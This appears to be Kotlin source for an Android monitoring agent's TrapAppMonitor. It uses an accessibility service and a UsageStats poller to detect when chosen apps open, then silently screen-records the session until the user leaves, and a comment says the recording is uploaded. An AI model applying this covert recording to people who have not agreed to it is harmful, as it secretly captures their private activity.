package com.edr.agent.monitor

import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.edr.agent.screen.AppTrapScreenRecorder
import com.edr.agent.service.EdrAccessibilityService
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences
import java.util.Collections
import java.util.concurrent.ConcurrentHashMap

/**
 * TrapAppMonitor: Monitors for trapped (watched) apps opening on the device.
 *
 * When a configured app opens, it silently starts screen recording via AppTrapScreenRecorder.
 * When the app closes or the user navigates away, it cleanly stops and uploads the recording.
 *
 * Key Design Principles:
 *  1. One Continuous Recording per App Session:
 *     Internal activity transitions, popups, keyboards, or transient overlays do NOT split the recording.
 *  2. Robust Stop Confirmation:
 *     Waits 3.5 seconds and verifies via multiple window layers before finalizing the recording.
 *  3. No False Lockouts:
 *     Short 2.5-second debounce between distinct sessions prevents duplicate launch events without blocking subsequent app opens.
 */
object TrapAppMonitor {
    private const val TAG = "TrapAppMonitor"

    // Debounce to prevent multiple launch events during a single app startup
    private const val SESSION_DEBOUNCE_MS = 2500L
    // Confirmation delay before finalizing a recording after user appears to leave
    private const val STOP_CONFIRM_DELAY_MS = 3500L

    private val TRANSIENT_SYSTEM_PACKAGES = setOf(
        "com.android.systemui",
        "android",
        "com.android.permissioncontroller",
        "com.google.android.permissioncontroller",
        "com.vivo.permissionmanager",
        "com.vivo.systemuiplugin",
        "com.vivo.floatingball",
        "com.vivo.smartmultiwindow",
        "com.vivo.upslide",
        "com.vivo.daemonService",
        "com.lbe.security.miui",
        "com.miui.securitycenter",
        "com.google.android.inputmethod.latin",
        "com.emoji.keyboard.touchpal",
        "com.baidu.input_vivo",
        "com.sohu.inputmethod.sogou",
        "com.touchtype.swiftkey",
        "com.samsung.android.honeyboard"
    )

    private val trapPackages = Collections.synchronizedSet(mutableSetOf<String>())
    private val lastSessionEndTimeMap = ConcurrentHashMap<String, Long>()
    private val appLabelCache = ConcurrentHashMap<String, String>()
    private var isInitialized = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private var pendingStopRunnable: Runnable? = null
    private var pendingStopPkg: String? = null

    @Volatile
    private var lastPolledEventTime = 0L

    // Own package name cached
    private var ownPackageName = ""

    private fun isTransientSystemPackage(pkg: String): Boolean {
        if (pkg.isEmpty() || pkg == ownPackageName) return true
        if (pkg in TRANSIENT_SYSTEM_PACKAGES) return true
        val p = pkg.lowercase()
        return p.contains("inputmethod") ||
            p.contains("keyboard") ||
            p.contains("systemui") ||
            p.contains("floatingball") ||
            p.contains("permissioncontroller") ||
            p.contains("smartmultiwindow") ||
            p.contains("autofill") ||
            p.contains("documentsui") ||
            p.contains("dialog") ||
            p.contains("chooser") ||
            p.contains("wallpaper") ||
            p.contains("overlay") ||
            p.contains("upslide") ||
            p.contains("gms") ||
            p == "android"
    }

    /**
     * Checks all accessible window layers to verify if the expected package is still active on screen.
     */
    private fun isAppStillActiveOnScreen(expectedPkg: String): Boolean {
        val a11y = EdrAccessibilityService.instance ?: return false
        try {
            // 1. Check primary active window
            val activeRootPkg = a11y.rootInActiveWindow?.packageName?.toString()
            if (activeRootPkg == expectedPkg) return true

            // 2. Check all on-screen windows (popups, dialogs, sub-windows)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val windowList = a11y.windows
                for (w in windowList) {
                    if (w.root?.packageName?.toString() == expectedPkg) {
                        return true
                    }
                }
            }
        } catch (ignored: Exception) {}
        return false
    }

    private fun scheduleDeferredStop(context: Context, expectedRecordingPkg: String, reason: String) {
        val appContext = context.applicationContext

        // If a stop is already pending for this package, let it run; if for another, cancel and reset
        if (pendingStopRunnable != null && pendingStopPkg == expectedRecordingPkg) {
            return
        }
        cancelDeferredStop()

        pendingStopPkg = expectedRecordingPkg
        val runnable = Runnable {
            pendingStopRunnable = null
            pendingStopPkg = null

            if (AppTrapScreenRecorder.isCurrentlyRecording()
                && AppTrapScreenRecorder.getRecordingPackage() == expectedRecordingPkg
            ) {
                // Ground-truth check: is the app still on screen?
                if (isAppStillActiveOnScreen(expectedRecordingPkg)) {
                    Log.d(TAG, "Ignoring deferred stop ($reason); '$expectedRecordingPkg' is still visible on screen.")
                    return@Runnable
                }

                Log.i(TAG, "$reason. Finalizing recording for '$expectedRecordingPkg'.")
                AppTrapScreenRecorder.stopRecording(appContext)
                lastSessionEndTimeMap[expectedRecordingPkg] = System.currentTimeMillis()
            }
        }

        pendingStopRunnable = runnable
        mainHandler.postDelayed(runnable, STOP_CONFIRM_DELAY_MS)
    }

    private fun cancelDeferredStop() {
        pendingStopRunnable?.let {
            mainHandler.removeCallbacks(it)
            pendingStopRunnable = null
            pendingStopPkg = null
        }
    }

    @Synchronized
    fun initialize(context: Context) {
        if (!isInitialized) {
            ownPackageName = context.packageName
            val saved = SyncPreferences.getTrapAppPackages()
            trapPackages.clear()
            trapPackages.addAll(saved)
            isInitialized = true
            Log.i(TAG, "Initialized with ${trapPackages.size} trap package(s): $trapPackages")
        }
    }

    @Synchronized
    fun updateTrapPackages(packages: Set<String>) {
        trapPackages.clear()
        trapPackages.addAll(packages)
        SyncPreferences.setTrapAppPackages(packages)
        Log.i(TAG, "Trap packages updated: ${packages.size} app(s): $packages")
        com.edr.agent.service.EdrForegroundService.instance?.updateTrapFallbackSchedule()
    }

    fun getTrapPackages(): Set<String> = trapPackages.toSet()

    fun hasActiveTrapsOrRecording(): Boolean {
        return trapPackages.isNotEmpty() || AppTrapScreenRecorder.isCurrentlyRecording()
    }

    /**
     * Called instantly by EdrAccessibilityService when the foreground window changes.
     * This is the PRIMARY real-time detection path.
     *
     * @param context Application context
     * @param pkg     Package name of the newly-foreground app/window
     */
    fun onWindowChanged(context: Context, pkg: String) {
        if (pkg.isEmpty() || pkg == ownPackageName || isTransientSystemPackage(pkg)) {
            return
        }

        if (trapPackages.contains(pkg)) {
            // User is actively inside a trapped app
            cancelDeferredStop()

            // If already recording this exact app, DO NOT re-trigger or split into multiple recordings
            if (AppTrapScreenRecorder.isCurrentlyRecording() && AppTrapScreenRecorder.getRecordingPackage() == pkg) {
                return
            }

            // If recording a different app, finalize the previous one first
            if (AppTrapScreenRecorder.isCurrentlyRecording() && AppTrapScreenRecorder.getRecordingPackage() != pkg) {
                Log.i(TAG, "Switched from '${AppTrapScreenRecorder.getRecordingPackage()}' to new trap '$pkg'. Finalizing previous recording.")
                AppTrapScreenRecorder.stopRecording(context.applicationContext)
            }

            // Short debounce to prevent rapid double-starts during launcher animations
            val now = System.currentTimeMillis()
            val lastEnd = lastSessionEndTimeMap[pkg] ?: 0L
            if (now - lastEnd < SESSION_DEBOUNCE_MS) {
                Log.d(TAG, "Ignoring rapid re-launch within ${SESSION_DEBOUNCE_MS}ms debounce for '$pkg'.")
                return
            }

            val appLabel = resolveAppLabel(context, pkg)
            Log.w(TAG, "TRAP: '$appLabel' ($pkg) opened. Starting continuous screen recording.")
            EdrLocalStorage.appendEdrLog(
                context, "TRAP_ALERT",
                "Trap app opened: $appLabel. Continuous screen recording started."
            )
            AppTrapScreenRecorder.startRecording(context, pkg, appLabel)

        } else if (AppTrapScreenRecorder.isCurrentlyRecording()) {
            // User switched to an untrapped app or home screen; schedule stop with 3.5s confirmation
            val recordingPkg = AppTrapScreenRecorder.getRecordingPackage()
            if (recordingPkg != null && recordingPkg != pkg) {
                scheduleDeferredStop(context, recordingPkg, "Window switched to non-trap '$pkg'")
            }
        }
    }

    /**
     * Fallback poller using UsageStatsManager. Called periodically by EdrForegroundService.
     * Acts strictly as a backup if AccessibilityService is not yet running.
     */
    fun checkForegroundApp(context: Context) {
        if (trapPackages.isEmpty() && !AppTrapScreenRecorder.isCurrentlyRecording()) return

        // If AccessibilityService is connected and healthy, it handles all real-time events.
        // We do not let UsageStats poller issue delayed stops to avoid race conditions.
        val a11yReady = EdrAccessibilityService.isReady
        if (a11yReady && AppTrapScreenRecorder.isCurrentlyRecording()) {
            return
        }

        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager ?: return
        val now = System.currentTimeMillis()
        val queryStart = if (lastPolledEventTime > now - 10_000L) lastPolledEventTime else now - 6000L

        try {
            val events = usm.queryEvents(queryStart, now) ?: return
            val event = UsageEvents.Event()
            var latestForegroundPkg: String? = null
            var latestTime = lastPolledEventTime

            while (events.hasNextEvent()) {
                events.getNextEvent(event)
                if (event.timeStamp <= lastPolledEventTime) continue
                latestTime = maxOf(latestTime, event.timeStamp)

                val pkg = event.packageName ?: continue
                if (isTransientSystemPackage(pkg)) continue

                if (event.eventType == UsageEvents.Event.ACTIVITY_RESUMED) {
                    latestForegroundPkg = pkg
                }
            }

            lastPolledEventTime = latestTime
            val pkg = latestForegroundPkg ?: return

            if (trapPackages.contains(pkg)) {
                cancelDeferredStop()
                if (AppTrapScreenRecorder.isCurrentlyRecording() && AppTrapScreenRecorder.getRecordingPackage() == pkg) {
                    return
                }

                val nowTime = System.currentTimeMillis()
                val lastEnd = lastSessionEndTimeMap[pkg] ?: 0L
                if (nowTime - lastEnd >= SESSION_DEBOUNCE_MS) {
                    val appLabel = resolveAppLabel(context, pkg)
                    Log.w(TAG, "TRAP (UsageStats backup): '$appLabel' ($pkg) opened.")
                    EdrLocalStorage.appendEdrLog(
                        context, "TRAP_ALERT",
                        "Trap app opened (backup): $appLabel. Screen recording started."
                    )
                    AppTrapScreenRecorder.startRecording(context, pkg, appLabel)
                }
            } else if (!a11yReady && AppTrapScreenRecorder.isCurrentlyRecording()) {
                val recordingPkg = AppTrapScreenRecorder.getRecordingPackage()
                if (recordingPkg != null && recordingPkg != pkg) {
                    scheduleDeferredStop(context, recordingPkg, "UsageStats backup: switched to '$pkg'")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error in checkForegroundApp: ${e.message}")
        }
    }

    private fun resolveAppLabel(context: Context, pkg: String): String {
        appLabelCache[pkg]?.let { return it }
        val resolved = try {
            val pm = context.packageManager
            val info = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(info).toString()
        } catch (e: Exception) {
            pkg
        }
        appLabelCache[pkg] = resolved
        return resolved
    }
}
